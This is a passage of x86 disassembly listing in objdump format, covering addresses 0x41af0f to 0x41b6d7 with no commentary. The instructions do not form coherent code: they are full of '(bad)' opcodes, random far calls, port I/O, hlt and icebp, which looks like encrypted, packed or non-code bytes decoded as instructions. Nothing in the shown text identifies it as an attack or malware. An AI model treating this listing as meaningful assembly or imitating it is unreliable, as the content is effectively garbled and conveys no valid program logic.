  41af0f:	dec    eax
  41af10:	xchg   edx,eax
  41af11:	repz test eax,0xa37222fc
  41af17:	test   eax,0x1af82afb
  41af1c:	aaa    
  41af1d:	mov    dl,0xbd
  41af1f:	sub    al,0xe4
  41af21:	fdivr  DWORD PTR [ebp+eiz*4-0x7c7479ce]
  41af28:	pop    esi
  41af29:	cmp    eax,0xb67f358b
  41af2e:	call   0x6f37:0xc028348a
  41af35:	shr    bh,cl
  41af37:	xor    bl,ah
  41af39:	(bad)  
  41af3b:	mov    edx,0x14fa6264
  41af40:	ja     0x41aee0
  41af42:	sub    ah,BYTE PTR [esi+0x62]
  41af45:	and    BYTE PTR [eax+0x6685488c],bh
  41af4b:	pop    esp
  41af4c:	std    
  41af4d:	xchg   esp,eax
  41af4e:	xchg   edi,eax
  41af4f:	and    edx,esi
  41af51:	lock cmc 
  41af53:	hlt    
  41af54:	imul   ebp,DWORD PTR ds:0x102debd1,0xd
  41af5b:	jbe    0x41af1a
  41af5d:	js     0x41af2a
  41af5f:	xchg   ecx,eax
  41af60:	dec    ebp
  41af61:	lock lahf 
  41af63:	stos   DWORD PTR es:[edi],eax
  41af64:	xor    al,0xdd
  41af66:	in     al,0x4f
  41af68:	cwde   
  41af69:	(bad)  
  41af6b:	add    DWORD PTR [esi+edi*4-0xed9c15],ebp
  41af72:	(bad)  
  41af74:	iret   
  41af75:	mov    dl,BYTE PTR [ecx+ebp*2]
  41af78:	add    DWORD PTR [edi+esi*1],0x42
  41af7c:	dec    edi
  41af7d:	fcmovne st,st(4)
  41af7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af80:	xor    al,0x7e
  41af82:	ss mov ch,0xce
  41af85:	(bad)
  41af88:	mov    esp,0x986969
  41af8d:	rcr    DWORD PTR [ebp-0x16747843],1
  41af93:	enter  0x3d7a,0x30
  41af97:	fst    DWORD PTR [eax+0x68]
  41af9a:	(bad)  
  41af9b:	push   ss
  41af9c:	loop   0x41afb1
  41af9e:	xlat   BYTE PTR ds:[ebx]
  41af9f:	mov    edi,0xaad2466f
  41afa4:	mov    ecx,DWORD PTR [ebx+0x4b]
  41afa7:	push   ss
  41afa8:	in     al,0x4f
  41afaa:	je     0x41afd6
  41afac:	mov    ds:0xaae0c621,eax
  41afb1:	loop   0x41afd5
  41afb3:	mov    cl,0x6c
  41afb5:	std    
  41afb6:	sub    ebp,esp
  41afb8:	cmc    
  41afb9:	cli    
  41afba:	and    DWORD PTR [edx],edx
  41afbc:	idiv   BYTE PTR [esi+eax*4-0x333d12c6]
  41afc3:	lock test al,0x48
  41afc6:	adc    eax,0x9fc40ad3
  41afcb:	mov    cl,0x5a
  41afcd:	inc    esi
  41afce:	and    eax,DWORD PTR [ebp-0x41514b68]
  41afd4:	cmp    edi,DWORD PTR [ebp+0x1f]
  41afd7:	shl    BYTE PTR ds:0x413bffa7,cl
  41afdd:	jae    0x41afa8
  41afdf:	imul   BYTE PTR ds:0x83cf633b
  41afe5:	daa    
  41afe6:	cwde   
  41afe7:	xchg   edx,eax
  41afe8:	dec    edi
  41afe9:	fcomip st,st(3)
  41afeb:	push   eax
  41afec:	ret    
  41afed:	mov    ss,WORD PTR [bx+di+0x25a1]
  41aff2:	out    0xd7,eax
  41aff4:	jmp    0x41af82
  41aff6:	or     DWORD PTR [eax],ebp
  41aff8:	icebp  
  41aff9:	push   ebx
  41affa:	repnz (bad) 
  41affc:	cmp    eax,0x3c252e5
  41b001:	inc    edi
  41b002:	dec    edx
  41b003:	mov    ecx,0x524fdede
  41b008:	adc    ah,0xb4
  41b00b:	in     eax,dx
  41b00c:	xchg   ebx,eax
  41b00d:	fwait
  41b00e:	jle    0x41b02b
  41b010:	sub    eax,0xcd6461d9
  41b015:	mov    al,0x37
  41b017:	lock xor dh,BYTE PTR es:[eax]
  41b01b:	lea    edx,[edi+0x6a348123]
  41b021:	pusha  
  41b022:	sub    cl,BYTE PTR [ecx-0x4e31100b]
  41b028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b029:	pusha  
  41b02a:	jns    0x41b083
  41b02c:	and    DWORD PTR [edi+0x43],edx
  41b02f:	call   0x354d8143
  41b034:	ins    DWORD PTR es:[edi],dx
  41b035:	(bad)  
  41b036:	retf   0xe6f0
  41b039:	xchg   ecx,eax
  41b03a:	pop    eax
  41b03b:	jne    0x41b05a
  41b03d:	pushf  
  41b03e:	add    al,0x27
  41b040:	mov    cs,ebp
  41b042:	fdivr  QWORD PTR [esi-0x6bf4186d]
  41b048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b049:	popf   
  41b04a:	mov    esp,0x19d910c1
  41b04f:	cmp    eax,0x3a874122
  41b054:	xor    DWORD PTR [esi-0x77601f64],ecx
  41b05a:	cs lahf 
  41b05c:	xlat   BYTE PTR ds:[ebx]
  41b05d:	hlt    
  41b05e:	imul   eax
  41b060:	or     eax,0x814504b
  41b065:	adc    DWORD PTR [ebp-0x5e],esp
  41b068:	mov    cl,0x24
  41b06a:	pop    edi
  41b06b:	sub    DWORD PTR [edi],ebp
  41b06d:	retf   0x2915
  41b070:	and    dl,ch
  41b072:	pop    esp
  41b073:	lods   eax,DWORD PTR ds:[esi]
  41b074:	mov    ecx,0xabc18bb6
  41b079:	retf   0x23fb
  41b07c:	or     bl,dh
  41b07e:	retf   
  41b07f:	mov    ch,0x21
  41b081:	dec    esp
  41b082:	jle    0x41b097
  41b084:	xor    al,0x45
  41b086:	pop    edx
  41b087:	cvtpi2ps xmm1,QWORD PTR [eax]
  41b08a:	mov    ds:0xae67391e,al
  41b08f:	xchg   ebp,eax
  41b090:	adc    eax,0x84c956ef
  41b095:	int3   
  41b096:	inc    esp
  41b097:	icebp  
  41b098:	inc    ecx
  41b099:	loopne 0x41b0d8
  41b09b:	nop
  41b09c:	(bad)
  41b09f:	inc    eax
  41b0a0:	sbb    bl,0x81
  41b0a3:	or     cl,BYTE PTR [eax+0x7532b87f]
  41b0a9:	xor    esp,ecx
  41b0ab:	sbb    eax,0x3d4944f1
  41b0b0:	fdivrp st(7),st
  41b0b2:	cmp    eax,0xfb03889c
  41b0b7:	fs mov edx,0xf9eb73b2
  41b0bd:	mov    al,ds:0x64a73b04
  41b0c2:	jnp    0x41b088
  41b0c4:	int    0x39
  41b0c6:	sahf   
  41b0c7:	popa   
  41b0c8:	xlat   BYTE PTR ds:[ebx]
  41b0c9:	adc    bl,dl
  41b0cb:	jg     0x41b130
  41b0cd:	int    0xda
  41b0cf:	push   0x78
  41b0d1:	mov    al,cl
  41b0d3:	pop    ebp
  41b0d4:	sub    al,0x6a
  41b0d6:	and    al,0x86
  41b0d8:	jne    0x41b0d3
  41b0da:	aad    0x48
  41b0dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0dd:	add    dl,BYTE PTR [ecx+ebx*1-0x7f]
  41b0e1:	ret    
  41b0e2:	test   DWORD PTR [edx-0x24e72329],esp
  41b0e8:	leave  
  41b0e9:	rcl    DWORD PTR ds:0xc9972388,cl
  41b0ef:	(bad)  
  41b0f0:	iret   
  41b0f1:	and    bh,BYTE PTR [ebx]
  41b0f3:	sbb    eax,0xe8f323fd
  41b0f8:	rol    DWORD PTR [esp+ebx*4],1
  41b0fb:	iret   
  41b0fc:	or     ebx,DWORD PTR [ecx-0x67]
  41b0ff:	push   0x1e
  41b101:	sar    DWORD PTR [edi],1
  41b103:	ret    
  41b104:	jno    0x41b0e0
  41b106:	mov    eax,0x92136b2d
  41b10b:	xchg   ecx,eax
  41b10c:	aas    
  41b10d:	repnz sub bl,cl
  41b110:	add    eax,0x2127dbb1
  41b115:	pop    ebx
  41b116:	cmp    BYTE PTR [esi],al
  41b118:	ds inc eax
  41b11a:	out    dx,eax
  41b11b:	jle    0x41b0e9
  41b11d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b11e:	push   ss
  41b11f:	test   al,0xee
  41b121:	test   DWORD PTR [ebp+0x78],0xd00dfc88
  41b128:	ins    DWORD PTR es:[edi],dx
  41b129:	idiv   DWORD PTR [ebp-0x709b829e]
  41b12f:	aas    
  41b130:	xchg   edx,eax
  41b131:	adc    al,al
  41b133:	sub    eax,0xe15a556a
  41b138:	mov    edi,0x11c68275
  41b13d:	jbe    0x41b19e
  41b13f:	aad    0x15
  41b141:	(bad)  
  41b142:	mov    edi,0x84c80832
  41b147:	mov    dl,al
  41b149:	ds push ecx
  41b14b:	sub    al,0x91
  41b14d:	dec    ebx
  41b14e:	mov    edx,DWORD PTR ds:0xeebdd9e9
  41b154:	aaa    
  41b155:	mov    ch,0x6f
  41b157:	or     esi,DWORD PTR ds:0xea729416
  41b15d:	call   0x6824:0xbdca1712
  41b164:	inc    di
  41b166:	aas    
  41b167:	add    dh,BYTE PTR [edi+0x5dbcf274]
  41b16d:	hlt    
  41b16e:	cmc    
  41b16f:	push   ecx
  41b170:	clc    
  41b171:	stos   DWORD PTR es:[edi],eax
  41b172:	push   esp
  41b173:	mov    ebx,0xf0a3c393
  41b178:	es lock call 0x8016:0x7b04140c
  41b181:	fst    DWORD PTR [edx-0x4261fc2f]
  41b187:	fisubr DWORD PTR [ecx-0x63]
  41b18a:	mov    WORD PTR [ebp-0x13bce41f],?
  41b190:	popa   
  41b191:	or     cl,BYTE PTR [edx+eax*4+0x6f]
  41b195:	mov    al,al
  41b197:	cmp    dl,bl
  41b199:	arpl   WORD PTR [edx+0x7a],sp
  41b19c:	jne    0x41b20f
  41b19e:	in     eax,0x2f
  41b1a0:	or     BYTE PTR [edi+0x7a],ch
  41b1a3:	sbb    BYTE PTR [edx],bl
  41b1a5:	je     0x41b1a2
  41b1a7:	nop
  41b1a8:	jmp    0x41b1cb
  41b1aa:	leave  
  41b1ab:	inc    edi
  41b1ac:	xor    BYTE PTR [esi+ebx*4-0x5f5ec212],cl
  41b1b3:	dec    esi
  41b1b4:	adc    eax,0x7156f836
  41b1b9:	setp   BYTE PTR [ebx]
  41b1bc:	dec    esp
  41b1bd:	aaa    
  41b1be:	lds    ecx,FWORD PTR [edx-0x45]
  41b1c1:	dec    edx
  41b1c2:	ins    DWORD PTR es:[edi],dx
  41b1c3:	pop    ss
  41b1c4:	stc    
  41b1c5:	test   DWORD PTR ds:0x5a894bd2,ebx
  41b1cb:	clc    
  41b1cc:	cmp    DWORD PTR [edx+0x1a],ebx
  41b1cf:	(bad)  
  41b1d0:	adc    al,0xc4
  41b1d2:	adc    eax,ebx
  41b1d4:	fisttp QWORD PTR [ebp+0x73]
  41b1d7:	push   edx
  41b1d8:	jg     0x41b1e0
  41b1da:	jne    0x41b20e
  41b1dc:	jno    0x41b198
  41b1de:	stos   DWORD PTR es:[edi],eax
  41b1df:	test   eax,0x5562074
  41b1e4:	(bad)  
  41b1e5:	arpl   WORD PTR [ecx+0x1d],di
  41b1e8:	cmp    DWORD PTR [edx-0x2a23a3a5],ebp
  41b1ee:	and    esp,DWORD PTR [ebp-0x8]
  41b1f1:	imul   edx,DWORD PTR [edi+0x1],0xffffffa5
  41b1f5:	pushf  
  41b1f6:	fist   WORD PTR ds:0xa3406385
  41b1fc:	adc    eax,0x25536384
  41b201:	mov    cl,BYTE PTR [ebx-0x68]
  41b204:	test   ebp,eax
  41b206:	icebp  
  41b207:	mov    DWORD PTR ds:0xdc512f34,0xf5d1c97e
  41b211:	stc    
  41b212:	hlt    
  41b213:	and    eax,0x40a32083
  41b218:	ins    BYTE PTR es:[edi],dx
  41b219:	inc    esp
  41b21a:	mov    esi,0x7e3028a8
  41b21f:	mov    edx,ebp
  41b221:	(bad)  
  41b222:	je     0x41b20d
  41b224:	pop    ebp
  41b225:	lds    ebx,FWORD PTR [ebp+0x7ecce2e5]
  41b22b:	lods   al,BYTE PTR ds:[esi]
  41b22c:	xchg   edi,eax
  41b22d:	imul   edx,edx,0x5c186af0
  41b233:	push   ebx
  41b234:	push   0x7a
  41b236:	add    cl,BYTE PTR [esi+0x8]
  41b239:	sub    edi,DWORD PTR [ebx-0x6a]
  41b23c:	mov    BYTE PTR [ecx],dl
  41b23e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b23f:	mov    eax,0x769931d2
  41b244:	jbe    0x41b288
  41b246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b247:	daa    
  41b248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b249:	call   DWORD PTR [esi]
  41b24b:	inc    esi
  41b24c:	arpl   bp,ax
  41b24e:	xchg   DWORD PTR [ecx+edx*8+0x173f50f5],esi
  41b255:	sbb    DWORD PTR [ecx+0x35],0x28ca5b3
  41b25c:	jne    0x41b267
  41b25e:	rcl    BYTE PTR [edi-0x8],1
  41b261:	push   esp
  41b262:	pushf  
  41b263:	sbb    eax,0x94c89970
  41b268:	mov    ebp,0x760628e5
  41b26d:	cmp    BYTE PTR [edi+0x5d5ee9ea],0xa8
  41b274:	add    ch,BYTE PTR [edx-0x9]
  41b277:	jb     0x41b2c6
  41b279:	ins    BYTE PTR es:[edi],dx
  41b27a:	push   ebp
  41b27b:	mov    al,0x9a
  41b27d:	imul   edi,edi,0x6f0706e8
  41b283:	mov    DWORD PTR [edi+0x1d],ebx
  41b286:	adc    cl,BYTE PTR [esi]
  41b288:	sub    dl,BYTE PTR [edx+0x345468ae]
  41b28e:	outs   dx,DWORD PTR ds:[esi]
  41b28f:	inc    edi
  41b290:	scas   al,BYTE PTR es:[edi]
  41b291:	rcr    bl,cl
  41b293:	push   cs
  41b294:	adc    al,0x77
  41b296:	(bad)  
  41b297:	enter  0xb90e,0x81
  41b29b:	cmp    esi,DWORD PTR [esi+edi*4-0x37]
  41b29f:	jae    0x41b279
  41b2a1:	sahf   
  41b2a2:	pop    esi
  41b2a3:	leave  
  41b2a4:	mov    ecx,0xdd9b99f9
  41b2a9:	adc    BYTE PTR [ebp+0x33175cd6],0x6e
  41b2b0:	dec    edx
  41b2b1:	les    ebx,FWORD PTR [esi-0x8]
  41b2b4:	(bad)  
  41b2b5:	shl    DWORD PTR [edx+edx*8-0x5],cl
  41b2b9:	xor    al,0x31
  41b2bb:	sub    bh,BYTE PTR [edx-0x52385de1]
  41b2c1:	inc    edi
  41b2c2:	aaa    
  41b2c3:	jnp    0x41b340
  41b2c5:	mov    ebx,0xbb830826
  41b2ca:	les    edi,FWORD PTR ds:0xab1e965a
  41b2d0:	jbe    0x41b329
  41b2d2:	ss cmp eax,0x36c24027
  41b2d8:	cmp    eax,0x24e44a86
  41b2dd:	mov    ds:0x6713c411,al
  41b2e2:	push   esp
  41b2e3:	xchg   esp,eax
  41b2e4:	jb     0x41b27d
  41b2e6:	retf   0x7a11
  41b2e9:	shl    BYTE PTR [ebp+0x642bc5b8],1
  41b2ef:	(bad)  
  41b2f0:	push   cs
  41b2f1:	scas   eax,DWORD PTR es:[edi]
  41b2f2:	push   edx
  41b2f3:	mov    esi,0xb029ed8e
  41b2f8:	call   0x4d1fe9ec
  41b2fd:	fsub   DWORD PTR [ecx-0x62]
  41b300:	inc    edi
  41b301:	fsub   QWORD PTR [edi-0x27]
  41b304:	fisubr DWORD PTR ds:0xe4718e89
  41b30a:	aas    
  41b30b:	xor    BYTE PTR [esi-0x9],ah
  41b30e:	daa    
  41b30f:	test   DWORD PTR [edx],esi
  41b311:	ficomp WORD PTR [ebx-0x34]
  41b314:	fnsave [edi+0x58]
  41b317:	mov    edi,0xb774224b
  41b31c:	mov    dl,0x96
  41b31e:	jp     0x41b2fe
  41b320:	loop   0x41b2c0
  41b322:	lock dec ebp
  41b324:	pop    ss
  41b325:	sub    eax,0xc920bc8
  41b32a:	push   esp
  41b32b:	lock inc BYTE PTR [edx+0x60754d16]
  41b332:	sbb    al,0x2d
  41b334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b335:	pop    ebp
  41b336:	cmc    
  41b337:	xchg   BYTE PTR [ecx],cl
  41b339:	adc    al,0x7e
  41b33b:	pop    esp
  41b33c:	int    0x33
  41b33e:	aas    
  41b33f:	repz sbb DWORD PTR ds:0x7821d5dc,edi
  41b346:	arpl   WORD PTR [esp+eiz*4+0x40],bx
  41b34a:	fist   WORD PTR [eax+eax*8+0x1d6bb5e9]
  41b351:	sbb    dl,BYTE PTR [ebx-0x3c062dd]
  41b357:	jb     0x41b37c
  41b359:	ins    DWORD PTR es:[edi],dx
  41b35a:	adc    dh,BYTE PTR [ebx]
  41b35c:	fsubr  DWORD PTR [ebx+edx*1]
  41b35f:	aas    
  41b360:	(bad)  
  41b361:	inc    BYTE PTR [edi-0x1ad1e8f]
  41b367:	int    0x45
  41b369:	pop    edi
  41b36a:	sahf   
  41b36b:	add    al,BYTE PTR [esi-0x6d]
  41b36e:	repnz std 
  41b370:	test   al,0xf4
  41b372:	dec    edx
  41b373:	mov    ah,0xf0
  41b375:	xchg   esi,eax
  41b376:	add    eax,0x7b7ce4e3
  41b37b:	mov    WORD PTR [ecx+edx*4-0x5bebeb4b],?
  41b382:	add    ebp,DWORD PTR [esi]
  41b384:	cmp    eax,0xa7b27ec8
  41b389:	sbb    al,0x28
  41b38b:	cmp    al,0x6a
  41b38d:	sub    bl,cl
  41b38f:	popa   
  41b390:	nop    DWORD PTR [ebp-0x3110c840]
  41b397:	inc    eax
  41b398:	aam    0x22
  41b39a:	push   ecx
  41b39b:	inc    ecx
  41b39c:	inc    eax
  41b39d:	fadd   st,st(3)
  41b39f:	add    eax,0x84872e7f
  41b3a4:	xor    BYTE PTR [ecx-0x42],bl
  41b3a7:	or     dh,BYTE PTR [esi-0x39e10011]
  41b3ad:	pop    ecx
  41b3ae:	xchg   DWORD PTR [esp+ecx*2-0x333e43bb],esp
  41b3b5:	adc    ebx,DWORD PTR [ebp+0x16bd208a]
  41b3bb:	jle    0x41b3f4
  41b3bd:	mov    esp,0x65513669
  41b3c2:	jbe    0x41b41a
  41b3c4:	sub    al,0x12
  41b3c6:	mov    ecx,0x8521b406
  41b3cb:	leave  
  41b3cc:	shl    BYTE PTR [esi],cl
  41b3ce:	call   0x631c:0x2051bbd0
  41b3d5:	dec    esp
  41b3d6:	jle    0x41b446
  41b3d8:	mov    edx,0x2525f416
  41b3dd:	push   ds
  41b3de:	mov    al,0x98
  41b3e0:	nop
  41b3e1:	ficomp DWORD PTR [edx+ebp*1-0x4b]
  41b3e5:	pop    ebp
  41b3e6:	ret    0x384a
  41b3e9:	loope  0x41b469
  41b3eb:	mov    ecx,0x44b0d45e
  41b3f0:	adc    eax,0xec14cd55
  41b3f5:	or     BYTE PTR [esi+ecx*2],al
  41b3f8:	or     al,0xdb
  41b3fa:	dec    ebp
  41b3fb:	js     0x41b39f
  41b3fd:	mov    ds:0xc05f1022,eax
  41b402:	lods   eax,DWORD PTR ds:[esi]
  41b403:	and    dh,BYTE PTR [edi]
  41b405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b406:	pop    es
  41b407:	std    
  41b408:	or     eax,0xfc00e6f7
  41b40d:	test   DWORD PTR [edi+0x728e971a],esp
  41b413:	das    
  41b414:	pop    ebx
  41b415:	pop    es
  41b416:	xor    cl,BYTE PTR [ebx-0x26]
  41b419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b41a:	sbb    eax,0xbd94f171
  41b41f:	popa   
  41b420:	stos   DWORD PTR es:[di],eax
  41b422:	clc    
  41b423:	mov    eax,ds:0xf0766891
  41b428:	int    0x53
  41b42a:	or     BYTE PTR [eax+ebx*1],0x95
  41b42e:	sbb    DWORD PTR [ecx+0x56],esp
  41b431:	out    dx,al
  41b432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b433:	xchg   ebp,eax
  41b434:	jecxz  0x41b3f6
  41b436:	test   DWORD PTR [edi+0x52],0x142ddfd8
  41b43d:	outs   dx,BYTE PTR ds:[esi]
  41b43e:	add    BYTE PTR [ebp+0x241c4b71],dl
  41b444:	sub    eax,DWORD PTR [ecx+0xa9e087f]
  41b44a:	hlt    
  41b44b:	in     eax,dx
  41b44c:	sub    DWORD PTR [edi-0x4f],esi
  41b44f:	div    BYTE PTR [ebx]
  41b451:	mov    ecx,0x5358e9c7
  41b456:	push   0xe742717c
  41b45b:	jl     0x41b41f
  41b45d:	dec    ecx
  41b45e:	sub    BYTE PTR [edi],ah
  41b460:	test   DWORD PTR ds:0x31d39d58,edx
  41b466:	test   DWORD PTR [edi],0x16ab61c5
  41b46c:	stos   DWORD PTR es:[edi],eax
  41b46d:	pop    esp
  41b46e:	enter  0x4a14,0x74
  41b472:	je     0x41b463
  41b474:	imul   DWORD PTR [esi-0x50]
  41b477:	cmc    
  41b478:	pop    es
  41b479:	aam    0x8f
  41b47b:	sub    eax,0xffed1ac9
  41b480:	in     al,dx
  41b481:	das    
  41b482:	(bad)  
  41b483:	xlat   BYTE PTR ds:[ebx]
  41b484:	(bad)  
  41b485:	ins    DWORD PTR es:[edi],dx
  41b486:	mov    dh,0xff
  41b488:	pop    ecx
  41b489:	lds    ecx,FWORD PTR [edx+eiz*1]
  41b48c:	inc    edx
  41b48d:	das    
  41b48e:	div    BYTE PTR [eax]
  41b490:	les    edx,FWORD PTR [ebp+0x19]
  41b493:	lahf   
  41b494:	sbb    BYTE PTR [eax-0xee2f829],dl
  41b49a:	aad    0x99
  41b49c:	dec    ecx
  41b49d:	cs mov esp,0xd7ff9031
  41b4a3:	cmp    ah,bl
  41b4a5:	xor    esp,DWORD PTR [esp+ecx*2-0x3ef10e64]
  41b4ac:	ret    0xb920
  41b4af:	mov    al,0x50
  41b4b1:	sar    DWORD PTR [ebp+0x19a0398d],cl
  41b4b7:	ds (bad) 
  41b4b9:	sub    BYTE PTR [edx+0x69a6075c],al
  41b4bf:	arpl   WORD PTR ds:0xb047b8e1,cx
  41b4c5:	cmp    eax,0x59cb01be
  41b4ca:	and    bl,BYTE PTR [edx+edi*2+0x66edcad5]
  41b4d1:	lahf   
  41b4d2:	stc    
  41b4d3:	pusha  
  41b4d4:	(bad)  
  41b4d5:	call   0xbe8e403f
  41b4da:	int3   
  41b4db:	xchg   esi,eax
  41b4dc:	push   es
  41b4dd:	jns    0x41b472
  41b4df:	(bad)  
  41b4e1:	inc    ebx
  41b4e2:	sbb    eax,0xaacb851e
  41b4e7:	imul   eax,eax,0x118b1d73
  41b4ed:	cmp    DWORD PTR [esi],esi
  41b4ef:	fld    DWORD PTR ds:0xc17d04f5
  41b4f5:	idiv   DWORD PTR [ebx+0x5bf48cc3]
  41b4fb:	shl    DWORD PTR [ebx-0x16],cl
  41b4fe:	xor    DWORD PTR [ecx+ecx*2],ebp
  41b501:	push   edi
  41b502:	(bad)  
  41b503:	jnp    0x41b4d4
  41b505:	outs   dx,BYTE PTR ds:[esi]
  41b506:	push   ds
  41b507:	test   eax,0x8f224964
  41b50c:	fist   DWORD PTR [edi+0x5a1327cf]
  41b512:	hlt    
  41b513:	push   ss
  41b514:	inc    edi
  41b515:	jbe    0x41b4ae
  41b517:	aam    0xc9
  41b519:	dec    ecx
  41b51a:	call   0x8203ed80
  41b51f:	pop    ss
  41b520:	pusha  
  41b521:	test   dh,dh
  41b523:	xlat   BYTE PTR ds:[ebx]
  41b524:	in     al,dx
  41b525:	jecxz  0x41b4c9
  41b527:	jmp    0x41b50d
  41b529:	xor    BYTE PTR [edi-0x589cc4ce],dh
  41b52f:	mov    ah,0xe3
  41b531:	popa   
  41b532:	inc    eax
  41b533:	popa   
  41b534:	add    DWORD PTR [ecx],0x4133ebce
  41b53a:	xor    esp,DWORD PTR [eax]
  41b53c:	pop    edi
  41b53d:	shl    BYTE PTR [edi-0x1320e83e],cl
  41b543:	push   0x3245252b
  41b548:	pop    ecx
  41b549:	je     0x41b597
  41b54b:	jmp    0x9719:0xc0f6ae9f
  41b552:	sbb    al,0x8f
  41b554:	les    ebx,FWORD PTR [esp+eiz*8]
  41b557:	dec    ebx
  41b558:	push   ebp
  41b559:	enter  0x799e,0x8a
  41b55d:	push   esp
  41b55e:	mov    dl,0x68
  41b560:	sub    al,0xdc
  41b562:	enter  0x1b5e,0x7
  41b566:	ins    DWORD PTR es:[edi],dx
  41b567:	retf   
  41b568:	fbld   TBYTE PTR [ebx]
  41b56a:	int    0x58
  41b56c:	(bad)  
  41b56d:	dec    ecx
  41b56e:	outs   dx,BYTE PTR ds:[esi]
  41b56f:	clc    
  41b570:	lods   al,BYTE PTR ds:[esi]
  41b571:	lock loopne 0x41b59c
  41b574:	dec    esp
  41b575:	(bad)  
  41b576:	cmp    eax,0x25c8d83e
  41b57b:	jae    0x41b530
  41b57d:	es push 0x5e472cab
  41b583:	je     0x41b55d
  41b585:	adc    BYTE PTR [esp+eiz*4+0x68],cl
  41b589:	pop    ebx
  41b58a:	jl     0x41b5a7
  41b58c:	pop    ds
  41b58d:	cmp    BYTE PTR [esi-0xd],dh
  41b590:	aam    0x7a
  41b592:	xchg   ebx,eax
  41b593:	aaa    
  41b594:	or     eax,0x484e6d2d
  41b599:	cmp    bl,bh
  41b59b:	iret   
  41b59c:	sar    BYTE PTR [ebx-0x6b89debd],1
  41b5a2:	jbe    0x41b5af
  41b5a4:	and    cl,dl
  41b5a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5a7:	and    BYTE PTR [ecx-0x6ac26a1f],dl
  41b5ad:	push   0xfffffffc
  41b5af:	and    DWORD PTR [edx+0x653418a4],eax
  41b5b5:	or     al,bh
  41b5b7:	popa   
  41b5b8:	clc    
  41b5b9:	dec    ebx
  41b5ba:	out    dx,eax
  41b5bb:	add    ch,BYTE PTR [esi+0x3b]
  41b5be:	pop    esp
  41b5bf:	pop    eax
  41b5c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5c1:	fucomip st,st(7)
  41b5c3:	clc    
  41b5c4:	lahf   
  41b5c5:	add    al,0x45
  41b5c7:	rol    BYTE PTR [eax-0x620aaa18],0xdf
  41b5ce:	jp     0x41b565
  41b5d0:	inc    ebx
  41b5d1:	call   0xc57e:0x2138806a
  41b5d8:	ds mov cl,0xff
  41b5db:	or     al,0x57
  41b5dd:	or     al,0x57
  41b5df:	movhps QWORD PTR [esi],xmm0
  41b5e2:	fs xor bl,al
  41b5e5:	push   ds
  41b5e6:	inc    ebx
  41b5e7:	mov    ds:0x76e3d979,al
  41b5ec:	(bad)  
  41b5ed:	cmp    cl,dh
  41b5ef:	xchg   esp,eax
  41b5f0:	mov    ds:0xccab21f5,eax
  41b5f5:	pop    esp
  41b5f6:	loopne 0x41b5d0
  41b5f8:	clc    
  41b5f9:	and    BYTE PTR [ebx-0x9fc9181],0x8c
  41b600:	loope  0x41b5d6
  41b602:	mov    edi,0x21a59c67
  41b607:	pop    ds
  41b608:	(bad)  
  41b60a:	mov    esp,0x43604c96
  41b60f:	lds    esi,FWORD PTR [edi]
  41b611:	push   0x11
  41b613:	lahf   
  41b614:	mov    DWORD PTR [edx+0x6b],edx
  41b617:	in     eax,dx
  41b618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b619:	pushf  
  41b61a:	daa    
  41b61b:	repz arpl bp,cx
  41b61e:	jg     0x41b5c5
  41b620:	dec    ecx
  41b621:	cmp    ah,dl
  41b623:	add    bh,ch
  41b625:	inc    esi
  41b626:	(bad)  
  41b627:	push   ebx
  41b628:	mov    dl,0x4
  41b62a:	and    eax,0x29548269
  41b62f:	dec    esi
  41b630:	nop
  41b631:	int    0xb3
  41b633:	(bad)  
  41b634:	repnz xor edx,DWORD PTR [esi+0x7ef6613c]
  41b63b:	cli    
  41b63c:	call   0x68deffe0
  41b641:	out    0xf7,al
  41b643:	or     al,0x4b
  41b645:	jnp    0x41b658
  41b647:	sub    BYTE PTR [eax+0x559ac811],ah
  41b64d:	pop    edi
  41b64e:	adc    esp,DWORD PTR [ecx+0x4f060788]
  41b654:	retf   
  41b655:	mov    DWORD PTR [ecx],edx
  41b657:	lock xlat BYTE PTR ds:[ebx]
  41b659:	stc    
  41b65a:	iret   
  41b65b:	(bad)  
  41b65c:	shl    BYTE PTR [edx],0x66
  41b65f:	mov    ds:0xd35d5355,al
  41b664:	mov    dl,0xe8
  41b666:	repz jmp 0x948c7d2d
  41b66c:	int    0x16
  41b66e:	push   ds
  41b66f:	out    0xd7,al
  41b671:	add    al,0xcb
  41b673:	scas   al,BYTE PTR es:[di]
  41b675:	mov    edi,0x86fccccd
  41b67a:	mov    al,0x73
  41b67c:	add    DWORD PTR [esi+0x631f7025],edi
  41b682:	pop    edx
  41b683:	cli    
  41b684:	fbstp  TBYTE PTR [ebp-0x1fbe91b5]
  41b68a:	out    0xcf,al
  41b68c:	int    0x77
  41b68e:	imul   esp,DWORD PTR [edx-0x3af3934e],0xcaf1de6a
  41b698:	push   0x4b
  41b69a:	dec    eax
  41b69b:	mov    ebp,0xd9150676
  41b6a0:	in     al,0x55
  41b6a2:	and    ecx,0xe0a049a9
  41b6a8:	or     DWORD PTR [edi+0x146e8e0e],esp
  41b6ae:	adc    al,0x58
  41b6b0:	je     0x41b6f9
  41b6b2:	and    ebp,edi
  41b6b4:	lods   eax,DWORD PTR ds:[esi]
  41b6b5:	pushf  
  41b6b6:	dec    edx
  41b6b7:	mov    ah,0xfc
  41b6b9:	adc    al,0x3c
  41b6bb:	add    al,dl
  41b6bd:	pop    ebx
  41b6be:	mov    ebp,0x478c54e3
  41b6c3:	jge    0x41b6eb
  41b6c5:	ja     0x41b713
  41b6c7:	sbb    ch,BYTE PTR [esi]
  41b6c9:	or     al,0x74
  41b6cb:	add    eax,0x61b6baff
  41b6d0:	sbb    eax,edx
  41b6d2:	push   esp
  41b6d3:	pop    edx
  41b6d4:	sub    dl,BYTE PTR [ecx+eiz*4]
  41b6d7:	push   es
